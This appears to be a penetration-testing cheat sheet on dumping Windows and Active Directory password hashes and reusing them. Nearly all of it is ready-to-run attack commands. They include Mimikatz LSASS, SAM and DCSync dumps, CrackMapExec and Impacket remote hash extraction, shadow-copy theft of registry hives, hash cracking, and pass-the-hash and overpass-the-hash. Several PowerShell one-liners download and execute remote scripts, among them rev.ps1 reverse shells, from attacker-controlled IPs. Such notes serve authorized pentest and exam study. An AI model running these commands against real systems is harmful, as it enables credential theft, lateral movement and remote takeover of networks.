# Password hash dump and reuse

{% embed url="https://juggernaut-sec.com/category/active-directory-hacking/" %}

{% hint style="info" %}
Can use [xfreerdp ](../#rdp)to PTH RDP
{% endhint %}

### Local logon password dump&#x20;

{% code overflow="wrap" %}
```powershell
https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1


powershell "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.132:8080/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"

Import-Module .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonPasswords" "lsadump::sam" "exit"'
```
{% endcode %}

#### mimikatz.exe (need high integrity)

{% code overflow="wrap" %}
```
crackmapexec smb/mssql 1.1.1.1 -u Administrator -p 'Pwd' -M mimikatz -o COMMAND='privilege::debug'
-H nthash
```
{% endcode %}

{% code overflow="wrap" %}
```
token::elevate
#to elevate the security token from high integrity (administrator) to SYSTEM integrity (no need if mimikatz launch from SYSTEM shell)
```
{% endcode %}

dump from memory LSASS

<pre><code><strong>.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
</strong></code></pre>

dump from SAM

```
lsadump::sam
```

```
.\mimikatz.exe "lsadump::secrets" "exit"
```

{% code overflow="wrap" %}
```
.\mimikatz64.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets" "exit"
```
{% endcode %}

crack

```
john --wordlist=/usr/share/wordlists/rockyou.txt ntlmhash.txt --format=NT 
```

#### CME dump hashes remotely (with local admin creds/hash)

<pre data-overflow="wrap"><code><strong>#lsass
</strong><strong>crackmapexec smb 172.16.1.100 -u admin -p 'pwd' -M lsassy --local-auth
</strong><strong>(-d if domain user is local admin)
</strong><strong>
</strong><strong>#sam
</strong>crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam
(-H nthash)
</code></pre>

#### Impacket dump all user password  from SAM&#x20;

{% hint style="info" %}
useful when having admin shell but no account creds, to get local admin hash for pth
{% endhint %}

victim

```
reg save HKLM\SAM .\SAM
reg save HKLM\SYSTEM .\SYSTEM
```

kali

<pre><code><strong>impacket-secretsdump -system SYSTEM -sam SAM LOCAL
</strong>samdump2 SYSTEM SAM
</code></pre>

with admin creds can dump from kali remote

{% code overflow="wrap" %}
```
impacket-secretsdump kudos.local/user:pwd@192.168.200.158
or user@ip -hashes :nthash

secretsdump.py domain.local/'dcadmin'@10.1.1.1 -hashes :nthash -dc-ip 10.1.1.1

crackmapexec smb 192.168.200.0/24 -u bwallis -d KUDOS.local -p P@ssWord! --sam
(-p -> -H :nthash)
```
{% endcode %}

alt

<pre data-overflow="wrap"><code><strong>powershell.exe -nop -exec bypass -c "IEX(New-Object Net.Webclient).DownloadString('http://172.16.1.30/Invoke-PowerDump.ps1'); Invoke-Powerdump"
</strong></code></pre>

{% hint style="info" %}
When have admin but not accessible SAM & SYSTEM, create a shadow copy and dump&#x20;
{% endhint %}

{% code overflow="wrap" %}
```
wmic shadowcopy call create Volume='C:\'
vssadmin.exe list shadows
(check shadow copy volume path eg \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3)

mkdir C:\temp
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SYSTEM C:\temp\SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SAM C:\temp\SAM

cd C:\temp && dir
```
{% endcode %}

{% hint style="info" %}
if no admin priv, may try look for .OLD SAM & SYSTEM

commonly in `C:\Windows\System32\Config`, `C:\Windows\System32\Repair`, or `C:\Windows\System32\Config\Regback`
{% endhint %}

```

cd C:\ & dir /S /B SAM == SYSTEM == SAM.OLD == SYSTEM.OLD == SAM.BAK == SYSTEM.BAK

icacls C:\Windows\System32\Config\SYSTEM.OLD
icacls C:\Windows\System32\Config\SAM.OLD
cp C:\Windows\System32\Config\SYSTEM.OLD C:\tmp
cp C:\Windows\System32\Config\SAM.OLD C:\tmp

cd C:\tmp && dir
```

### Domain password dump

`/user:target` e.g. built-in domain admin acct `Administrator`; or `/all`

{% code overflow="wrap" %}
```
.\mimikatz.exe "lsadump::dcsync /user:Administrator (/csv)" "exit"
```
{% endcode %}

#### Check where the credentials can be used

{% code overflow="wrap" %}
```
(Pwned = admin on the machine)
smb <-> winrm

crackmapexec smb 192.168.200.0/24 -u calcock -H 924572879ba3b163cc44e0abc5af208a --local-auth

crackmapexec smb 192.168.200.0/24 -u bwallis -d KUDOS.local -p P@ssWord!

crackmapexec smb 172.16.1.100 172.16.1.200 -u administrator -H 3542d79d5d17bc9d3014d4d56b5e3060 --local-auth --continue-on-success

(check against DC, pwned = own with psexec)
crackmapexec smb 172.16.1.5 -u nessex -H 0d53464368d5e2b607cd68ea29a8cc5f
crackmapexec winrm 172.16.1.5 -u nessex -H 0d53464368d5e2b607cd68ea29a8cc5f
```
{% endcode %}

#### CME PtH for rev

{% code overflow="wrap" %}
```
(-p password) (-x cmd -X ps)
crackmapexec smb 172.16.1.200 -u administrator -H 3542d79d5d17bc9d3014d4d56b5e3060 --local-auth -X "iex(new-object net.webclient).downloadstring('http://172.16.1.30/rev.ps1')"
```
{% endcode %}

#### NTLM PtH with local Administrator / AD user (not applicable to kerberos)

{% hint style="info" %}
works with local admin right, 445
{% endhint %}

{% code overflow="wrap" %}
```
pth-winexe -U
Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e
//10.11.0.22 "powershell.exe -c iex(new-object net.webclient).downloadstring('http://172.16.1.30/rev.ps1')"

pth-winexe - U username%lmhash:nthash //{host} command

impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5 domain.local/Administrator@192.168.221.57 

may only use the :NThash part
```
{% endcode %}

#### NTLM -> TGT Overpass the hash - gain tickets as specific users (other logoned local admin)

{% hint style="info" %}
works with local admin right
{% endhint %}

{% code overflow="wrap" %}
```
#TGT only can use on the machine that it was created

after sekurlsa::logonpasswords

sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
klist

(.\mimikatz.exe "sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:shell.exe" "exit"

NTLM -> TGT
#in new shell
net use \\dc01 (or any cmd that requires domain permissions and would subsequently initiate TGS)

klist

TGT -> RCE 
.\psexec.exe \\dc01 cmd.exe -accepteula (or -d -c C:\temp\shell.exe if placed in pivoter)
ipconfig && whoami

```
{% endcode %}

### No SMB Winrm

{% embed url="https://juggernaut-sec.com/dumping-credentials-lsass-process-hashes/#Example_Scenario_Extended_Runas_Reverse_Shell_UAC_Bypass" %}
